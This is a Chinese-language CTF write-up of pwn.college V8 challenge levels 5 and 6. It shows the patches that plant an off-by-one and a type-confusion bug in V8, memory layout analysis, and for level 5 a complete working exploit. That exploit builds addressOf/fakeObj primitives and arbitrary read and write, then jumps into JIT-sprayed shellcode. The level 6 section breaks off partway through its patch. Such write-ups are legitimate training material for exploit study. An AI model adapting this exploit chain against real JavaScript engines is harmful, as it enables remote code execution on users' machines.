![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_12BtCSPfB0.png)

level-5
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
➜  release
```

编译

```
autoninja -C out/release d8
```

漏洞分析
----

添加了一个 offByOne 的方法

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_9KBzqAbjzf.png)

首先判断 receiver 是不是 JSArray 和是否存在 hole，接着对于类型进行了限制，只能是 PACKED_DOUBLE_ELEMENTS、HOLEY_DOUBLE_ELEMENTS、PACKED_ELEMENTS 和 HOLEY_ELEMENTS

这里就需要上线经典老图，网址：[https://v8.dev/blog/elements-kinds](elink@adbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3z5q4)9J5k6h3c8W2N6W2)9J5c8X3u0D9L8$3N6Q4x3V1k6W2L8r3g2E0k6h3&6@1M7#2)9J5k6r3E0A6L8X3c8K6)

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_ALZhoR74Mo.png)

然后限制参数数量不超过两个，其实只能加 1 个，因为第一个参数是 receiver，接着去获取 array 的 length。

下面有两个分支，当类型为 PACKED_DOUBLE_ELEMENTS 和 HOLEY_DOUBLE_ELEMENTS 对应数组内都为浮点数的情况，此时 v8 就会使用更高效的 FixedDoubleArray 来存储元素；else 分支对应的情况是数组内存在了一些其他类型（对象、字符串 undfine、undifined、holes）的情况，采用 FixedArray 存储元素。

分支内的模式都是相同的，用户不传参数对应 read mode，传一个参数对应 write mode。read mode 直接返回 elements[len] 的元素内容，很典型的一个越界，write mode 会先判断用户穿入的参数类型是否为 Number，接着转化为 double 类型，然后 elements[len]=val，一个八字节的越界写

```
+BUILTIN(ArrayOffByOne) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle array = Cast(receiver);
+
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS && kind != HOLEY_DOUBLE_ELEMENTS && kind != PACKED_ELEMENTS && kind != HOLEY_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need an array of double numbers or objects")));
+  }
+
+  if (args.length() > 2) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Too many arguments")));
+  }
+ 
+  uint32_t len = static_cast(Object::NumberValue(array->length()));
+ 
+  if (kind == PACKED_DOUBLE_ELEMENTS || kind == HOLEY_DOUBLE_ELEMENTS) {
+    Handle elements(Cast(array->elements()), isolate);
+    if (args.length() == 1) {  // read mode
+      return *(isolate->factory()->NewNumber(elements->get_scalar(len)));
+    } else {  // write mode
+      Handle value = args.at(1);
+      if (!IsNumber(*value)) {
+        THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+          factory->NewStringFromAsciiChecked("Need a number argument")));
+      }
+      double num = static_cast(Object::NumberValue(*value));
+      elements->set(len, num);
+      return ReadOnlyRoots(isolate).undefined_value();
+    }
+  } else {
+    Handle elements(Cast(array->elements()), isolate);
+    if (args.length() == 1) {  // read mode
+      return elements->get(len);
+    } else {  // write mode
+      Handle value = args.at(1);
+      elements->set(len, *value);
+      return ReadOnlyRoots(isolate).undefined_value();
+    }
+  }
+} 
```

完整的 patch 内容

```
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..4ed66c8113f 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -407,6 +407,52 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
  
+BUILTIN(ArrayOffByOne) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle array = Cast(receiver);
+
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS && kind != HOLEY_DOUBLE_ELEMENTS && kind != PACKED_ELEMENTS && kind != HOLEY_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need an array of double numbers or objects")));
+  }
+
+  if (args.length() > 2) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Too many arguments")));
+  }
+ 
+  uint32_t len = static_cast(Object::NumberValue(array->length()));
+ 
+  if (kind == PACKED_DOUBLE_ELEMENTS || kind == HOLEY_DOUBLE_ELEMENTS) {
+    Handle elements(Cast(array->elements()), isolate);
+    if (args.length() == 1) {  // read mode
+      return *(isolate->factory()->NewNumber(elements->get_scalar(len)));
+    } else {  // write mode
+      Handle value = args.at(1);
+      if (!IsNumber(*value)) {
+        THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+          factory->NewStringFromAsciiChecked("Need a number argument")));
+      }
+      double num = static_cast(Object::NumberValue(*value));
+      elements->set(len, num);
+      return ReadOnlyRoots(isolate).undefined_value();
+    }
+  } else {
+    Handle elements(Cast(array->elements()), isolate);
+    if (args.length() == 1) {  // read mode
+      return elements->get(len);
+    } else {  // write mode
+      Handle value = args.at(1);
+      elements->set(len, *value);
+      return ReadOnlyRoots(isolate).undefined_value();
+    }
+  }
+}
+
 namespace {
  
 V8_WARN_UNUSED_RESULT Tagged GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..8a0bd959a29 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -394,6 +394,7 @@ namespace internal {
       ArraySingleArgumentConstructor)                                          \
   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
   CPP(ArrayConcat)                                                             \
+  CPP(ArrayOffByOne)                                                           \
   /* ES6 #sec-array.prototype.fill */                                          \
   CPP(ArrayPrototypeFill)                                                      \
   /* ES7 #sec-array.prototype.includes */                                      \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..ce31f92b876 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+  case Builtin::kArrayOffByOne:
+    return Type::Receiver();
  
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..99dc014c13c 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle global_object,
  
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+    SimpleInstallFunction(isolate_, proto, "offByOne",
+                          Builtin::kArrayOffByOne, 1, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin", 
```

漏洞利用
----

从上面不难看出这是一个八字节的越界读写漏洞，那么就要思考越界读写八字节的最大效果是什么。

看这一个 demo

```
function p(arg){
    %DebugPrint(arg);
}
 
var a1 = [1.1];
var a2 = [2.2];
p(a1);
p(a2);
```

输出如下

```
DebugPrint: 0x2b69000f4ac1: [JSArray]
 - map: 0x2b69001cb821 [FastProperties]
 - prototype: 0x2b69001cb179 - elements: 0x2b69000f4ad9 [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x2b6900000725 - All own properties (excluding elements): {
    0x2b6900000d99: [String] in ReadOnlySpace: #length: 0x2b6900025fed , data= 0x2b6900000069 > (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x2b69000f4ad9 {
           0: 1.1
 }
0x2b69001cb821: [Map] in OldSpace
 - map: 0x2b69001c01b5 )>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x2b69001cb7e1 - prototype_validity cell: 0x2b6900000a89 - instance descriptors #1: 0x2b69001cb7ad - transitions #1: 0x2b69001cb849 Transition array #1:
     0x2b6900000e5d : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x2b69001cb861 - prototype: 0x2b69001cb179 - constructor: 0x2b69001cae65 - dependent code: 0x2b6900000735 - construction counter: 0
 
DebugPrint: 0x2b69000f4af9: [JSArray]
 - map: 0x2b69001cb821 [FastProperties]
 - prototype: 0x2b69001cb179 - elements: 0x2b69000f4b11 [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x2b6900000725 - All own properties (excluding elements): {
    0x2b6900000d99: [String] in ReadOnlySpace: #length: 0x2b6900025fed , data= 0x2b6900000069 > (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x2b69000f4b11 {
           0: 2.2
 }
0x2b69001cb821: [Map] in OldSpace
 - map: 0x2b69001c01b5 )>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x2b69001cb7e1 - prototype_validity cell: 0x2b6900000a89 - instance descriptors #1: 0x2b69001cb7ad - transitions #1: 0x2b69001cb849 Transition array #1:
     0x2b6900000e5d : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x2b69001cb861 - prototype: 0x2b69001cb179 - constructor: 0x2b69001cae65 - dependent code: 0x2b6900000735 - construction counter: 0 
```

对于两个相邻的 JSArray 类型的对象，map 类型都为 PACKED_DOUBLE_ELEMENTS，越界 8 字节之后的输出是下一个对象的 map 和 properties，意味着我们可以读写这两个内容

```
pwndbg> job 0x2b69000f4ad9
0x2b69000f4ad9: [FixedDoubleArray]
 - map: 0x2b69000008a9 - length: 1
           0: 1.1
pwndbg> x/16wx 0x2b69000f4ad9-1
0x2b69000f4ad8:  0x000008a9  0x00000002  0x9999999a  0x3ff19999
0x2b69000f4ae8:  0x000008a9  0x00000002  0x9999999a  0x40019999
0x2b69000f4af8:  0x001cb821  0x00000725  0x000f4b11  0x00000002
0x2b69000f4b08:  0x000010a5  0x001d4a2d  0x000008a9  0x00000002
pwndbg> 
```

其实可以尝试一下相邻的对象类型是 JS_OBJECT_TYPE，这样就可以存在一个类型混淆

对于这一段代码

```
function p(arg){
    %DebugPrint(arg);
}
 
var a1 = [1.1];
var obj1 = {};
p(a1);
p(obj1);
```

输出如下

```
DebugPrint: 0x3027000f4ad9: [JSArray]
 - map: 0x3027001cb821 [FastProperties]
 - prototype: 0x3027001cb179 - elements: 0x3027000f4af1 [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x302700000725 - All own properties (excluding elements): {
    0x302700000d99: [String] in ReadOnlySpace: #length: 0x302700025fed , data= 0x302700000069 > (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x3027000f4af1 {
           0: 1.1
 }
0x3027001cb821: [Map] in OldSpace
 - map: 0x3027001c01b5 )>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x3027001cb7e1 - prototype_validity cell: 0x302700000a89 - instance descriptors #1: 0x3027001cb7ad - transitions #1: 0x3027001cb849 Transition array #1:
     0x302700000e5d : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3027001cb861 - prototype: 0x3027001cb179 - constructor: 0x3027001cae65 - dependent code: 0x302700000735 - construction counter: 0
 
DebugPrint: 0x3027000f4b01: [JS_OBJECT_TYPE]
 - map: 0x3027001c0f21 [FastProperties]
 - prototype: 0x3027001c10ed - elements: 0x302700000725 [HOLEY_ELEMENTS]
 - properties: 0x302700000725 - All own properties (excluding elements): {}
0x3027001c0f21: [Map] in OldSpace
 - map: 0x3027001c01b5 )>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 4
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - back pointer: 0x302700000069 - prototype_validity cell: 0x302700000a89 - instance descriptors (own) #0: 0x302700000759 - prototype: 0x3027001c10ed - constructor: 0x3027001c0c15 - dependent code: 0x302700000735 - construction counter: 0 
```

这里越界可以读到 obj 的 map 和 properties，因此 map 已经是可控制的了，这里一开始我尝试混淆相邻对象的 map，然后写 addressOf，但是地址非常不稳定，因此尝试了另外一个思路

```
pwndbg> job 0x3027000f4af1
0x3027000f4af1: [FixedDoubleArray]
 - map: 0x3027000008a9 - length: 1
           0: 1.1
pwndbg> x/32wx 0x3027000f4af1-1
0x3027000f4af0:  0x000008a9  0x00000002  0x9999999a  0x3ff19999
0x3027000f4b00:  0x001c0f21  0x00000725  0x00000725  0x00000069
0x3027000f4b10:  0x00000069  0x00000069  0x00000069  0x00000635
0x3027000f4b20:  0x00000008  0x00000004  0x00280023  0x00000100
0x3027000f4b30:  0x00000069  0x00000069  0x00000635  0x00000008
0x3027000f4b40:  0x00000004  0x001cb823  0x00000004  0x00000069
0x3027000f4b50:  0x00000069  0x00000000  0x00000000  0x00000000
0x3027000f4b60:  0x00000000  0x00000000  0x00000000  0x00000000
pwndbg> 
```

但是一般来说我们需要控制的内容是 elements，所以我们控制 properties 会有什么作用呢？这篇博客里介绍了 [https://v8.dev/blog/fast-properties](elink@69cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3z5q4)9J5k6h3c8W2N6W2)9J5c8X3u0D9L8$3N6Q4x3V1k6X3j5i4y4@1i4K6u0V1M7s2u0G2M7r3g2J5N6r3W2W2M7H3`.`.)，笔者这里简单介绍下，详细的需要自行看官方博客

下面这张图说明了 Named Properties 通过 properties 来索引，Indexed Properties 通过 elements 来索引

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_dMewYe0ShJ.png)

下面显示的是 in-object 会直接存储在 elements 的后面，然后 normal properties 就还是通过 properties 来索引

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_8g6VKft_qr.png)

对于这一段代码

```
let arr = [1.1];
let obj = {in_object1 : 1}; //in-object properties
obj.out_object1 = 2;    //normal properties
obj.out_object2 = 3;
 
p(arr);
p(obj);
```

这样的输出

```
DebugPrint: 0x1f99000f30e1: [JSArray]
 - map: 0x1f99001cb821 [FastProperties]
 - prototype: 0x1f99001cb179 - elements: 0x1f99000f30f9 [PACKED_DOUBLE_ELEMENTS]
 - length: 1
 - properties: 0x1f9900000725 - All own properties (excluding elements): {
    0x1f9900000d99: [String] in ReadOnlySpace: #length: 0x1f9900025fed , data= 0x1f9900000069 > (const accessor descriptor, attrs: [W__]), location: descriptor
 }
 - elements: 0x1f99000f30f9 {
           0: 1.1
 }
0x1f99001cb821: [Map] in OldSpace
 - map: 0x1f99001c01b5 )>
 - type: JS_ARRAY_TYPE
 - instance size: 16
 - inobject properties: 0
 - unused property fields: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - enum length: invalid
 - back pointer: 0x1f99001cb7e1 - prototype_validity cell: 0x1f9900000a89 - instance descriptors #1: 0x1f99001cb7ad - transitions #1: 0x1f99001cb849 Transition array #1:
     0x1f9900000e5d : (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x1f99001cb861 - prototype: 0x1f99001cb179 - constructor: 0x1f99001cae65 - dependent code: 0x1f9900000735 - construction counter: 0
 
DebugPrint: 0x1f99000f3109: [JS_OBJECT_TYPE]
 - map: 0x1f99001d417d [FastProperties]
 - prototype: 0x1f99001c10ed - elements: 0x1f9900000725 [HOLEY_ELEMENTS]
 - properties: 0x1f99000f315d - All own properties (excluding elements): {
    0x1f99001d351d: [String] in OldSpace: #in_object1: 1 (const data field 0, attrs: [WEC]) @ Any, location: in-object
    0x1f99001d3535: [String] in OldSpace: #out_object1: 2 (const data field 1, attrs: [WEC]) @ Any, location: properties[0]
    0x1f99001d354d: [String] in OldSpace: #out_object2: 3 (const data field 2, attrs: [WEC]) @ Any, location: properties[1]
 }
0x1f99001d417d: [Map] in OldSpace
 - map: 0x1f99001c01b5 )>
 - type: JS_OBJECT_TYPE
 - instance size: 16
 - inobject properties: 1
 - unused property fields: 1
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x1f99001d414d - prototype_validity cell: 0x1f99001d4175 - instance descriptors (own) #3: 0x1f99000f3171 - prototype: 0x1f99001c10ed - constructor: 0x1f99001c0c15 - dependent code: 0x1f9900000735 - construction counter: 0 
```

对于 Indexed Properties，这里是 elements 索引

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_rmwAfrQHQU.png)

这里的 in-object 直接存储在 elements 后面，然后 out-objs 也就是 normal properties，都使用了 properties 来索引，这里的值都 * 2，是因为这个 smi 的表示

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_s3XFscdpSk.png)

结合上面的观察，可以通过 8 字节的溢出可以覆盖到 properties，那么其实就可以控制 normal properties，如果修改为一个 obj 的 elements，然后使用 obj.out_object1 = xxxx; 来索引，同时修改值，这样就可以修改 elements 的 length，同时继续去修改 obj 的 length，这样就可以有一个 rw_array，有这个 rw_array 之后，写 addressOf、fakeObject、AAR、AAW 是很简单的了

构造如下结构，这样索引 out-obj1 的时候就可以修改 length 的值了，后面的步骤就是很熟悉的了

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_pJqCqWdxeL.png)

exp
---

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
 
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
 
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
function u32_to_f32(val){
    u32[0] = val;
    return f32[0];
}
 
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 10000; i++){
    shellcode();
}
 
function getOffByOne(target){
    return f64_to_u64(target.offByOne());
}
function setOffByOne(target, val){
    target.offByOne(Number((val)));
}
 
 
var oob_array = [1.1];
var obj = {in_obj:1};
obj.a = 2;
var b = [2.2];
 
// p(oob_array);
// p(obj);
// p(b);
 
obj_map_addr = u64_to_u32_lo(getOffByOne(oob_array)); //map, properties
obj_properties_addr = u64_to_u32_hi(getOffByOne(oob_array));
elements_addr_of_a = obj_properties_addr - 0x64;
logg("obj_map_addr", obj_map_addr);
logg("obj_properties_addr", obj_properties_addr);
logg("elements_addr_of_a", elements_addr_of_a);
 
setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4));
obj.a = 0x1000;
setOffByOne(oob_array, lh_u32_to_f64(obj_map_addr,elements_addr_of_a-4-0x10));
obj.a = 0x1000;
// console.log(oob_array.length);
 
let temp = f64_to_u64(oob_array[0x10]);
logg("tmp",temp);
 
double_array_map = u64_to_u32_lo(temp); //map, properties
double_properties_addr = u64_to_u32_hi(temp);
logg("double_array_map", double_array_map);
logg("double_properties_addr", double_properties_addr);
 
 
 
// // 修改了oob_array的elements length
 
function addressOf(object){
    oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
    b[0] = object;
    oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
    return f64_to_u64(b[0]);
}
 
 
 
function fakeObj(addr){
    oob_array[0x10] = lh_u32_to_f64(double_array_map,0);
    b[0] = lh_u32_to_f64(addr,0);
    oob_array[0x10] = lh_u32_to_f64(obj_map_addr,0);
    return b[0];
}
 
var fake_array = [
    lh_u32_to_f64(double_array_map,0),
    lh_u32_to_f64(0,0x1000)
];
 
var fake_array_addr = u64_to_u32_lo(addressOf(fake_array));
var fake_obj = fakeObj(fake_array_addr+0x54);
 
// p(fake_array);
logg("fake_array_addr",fake_array_addr);
 
function AAR(addr){
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    return f64_to_u64(fake_obj[0]);
}
 
function AAW(addr,val){
    logg("addr",addr);
    logg("val",val);
    fake_array[1] = lh_u32_to_f64(addr-8,0x1000);
    // stop();
    fake_obj[0] = u64_to_f64(val);
}
 
// p(shellcode);
var shellcode_addr = u64_to_u32_lo(addressOf(shellcode));
var code_addr = u64_to_u32_lo(AAR(shellcode_addr+0xc));
var ins_base = AAR((code_addr)+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
 
AAW(code_addr+0x14,(BigInt(ins_base)+0x6bn));
 
// stop();
shellcode();
 
// spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_ZxSdC-2eES.png)

level-6
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  current cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

接着编译

```
autoninja -C out/release d8
```

漏洞分析
----

添加了一个 functionMap 的方法

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_VDVFmdl05Y.png)

省略前面一部分的检查操作，这个和之前的都很类似，这个方法会获取一个参数，这个参数必须是 JSFunction

下面是主要逻辑，对原本 array 的所有元素进行操作，取出元素转换为 obj，也就是下面的 elem_handle，解释调用 func_obj，也就是用户穿入的自定义函数，参数就是 elem_handle，将返回值再写入原本的 elements 内

细看其实就会发现问题，这里没有对于元素类型进行检查，意味着我返回的元素类型可以改变为与原本对象不同的类型，那么这样就会导致原本对象的 map 改变，这样就可以实现类型混淆

```
+BUILTIN(ArrayFunctionMap) {
+  Handle func_obj = args.at(1);
+   ……………………………………
+  for (uint32_t i = 0; i < len; i++) {
+    double elem = Cast(array->elements())->get_scalar(i);
+    Handle elem_handle = factory->NewHeapNumber(elem);
+    Handle result = Execution::Call(isolate, func_obj, array, 1, &elem_handle).ToHandleChecked();
+    if (!IsNumber(*result)) {
+      THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+        factory->NewStringFromAsciiChecked("The function must return a number")));
+    }
+    double result_value = static_cast(Object::NumberValue(*result));
+    Cast(array->elements())->set(i, result_value);
+  }
+
+  return ReadOnlyRoots(isolate).undefined_value();
+} 
```

patch 的完整内容

```
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..d450412f3e6 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -407,6 +407,53 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
  
+BUILTIN(ArrayFunctionMap) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle array = Cast(receiver);
+
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need an array of double numbers")));
+  }
+
+  if (args.length() != 2) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need exactly one argument")));
+  }
+ 
+  uint32_t len = static_cast(Object::NumberValue(array->length()));
+
+  Handle func_obj = args.at(1);
+  if (!IsJSFunction(*func_obj)) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("The argument must be a function")));
+  }
+ 
+  for (uint32_t i = 0; i < len; i++) {
+    double elem = Cast(array->elements())->get_scalar(i);
+    Handle elem_handle = factory->NewHeapNumber(elem);
+    Handle result = Execution::Call(isolate, func_obj, array, 1, &elem_handle).ToHandleChecked();
+    if (!IsNumber(*result)) {
+      THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+        factory->NewStringFromAsciiChecked("The function must return a number")));
+    }
+    double result_value = static_cast(Object::NumberValue(*result));
+    Cast(array->elements())->set(i, result_value);
+  }
+
+  return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
  
 V8_WARN_UNUSED_RESULT Tagged GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..ede2775903e 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -394,6 +394,7 @@ namespace internal {
       ArraySingleArgumentConstructor)                                          \
   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
   CPP(ArrayConcat)                                                             \
+  CPP(ArrayFunctionMap)                                                        \
   /* ES6 #sec-array.prototype.fill */                                          \
   CPP(ArrayPrototypeFill)                                                      \
   /* ES7 #sec-array.prototype.includes */                                      \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..33cf2d2edad 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
